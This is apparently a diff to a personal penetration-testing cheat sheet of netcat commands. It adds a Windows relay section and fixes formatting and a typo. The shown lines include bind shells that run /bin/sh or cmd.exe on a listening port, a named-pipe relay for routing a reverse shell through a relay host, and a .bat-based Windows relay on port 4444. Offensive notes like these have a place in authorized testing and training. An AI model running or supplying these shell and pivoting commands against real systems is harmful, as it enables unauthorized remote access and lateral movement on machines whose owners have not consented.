@@ -42,11 +42,12 @@ nc -l -p <port> -e /bin/sh cmd.exe  #depending on OS
 connector:
 nc <listenrip> <listenerport>
 
-#netcat relay
-#linux
+--#netcat relay#--
+
+-#linux-
 #target
 nc -l -p <tgtport> -e cmd.exe
-#relay ost
+#relay host
 mknod relay1 p #p - FIFO obj mkfifo does the same as mknod
 nc -l -p <relayport> 0<relay1 | nc <tgtip> <tgtport> 1>relay1
 #0 - optional, just used to denote that 0=stdin
@@ -55,6 +56,13 @@ nc -l -p <relayport> < relay1 | nc <tgtip> <tgtport> > relay1
 #originating client endpoint
 nc <relayip> <relayport>
 #routing reverse shell through relay host
+
+-#Windows#-
+#create a .bat file
+relay.bat
+nc <ip> <port>
+nc -l -p 4444 -e relay.bat
+
 
 =======================================================================
 --# LOL #--
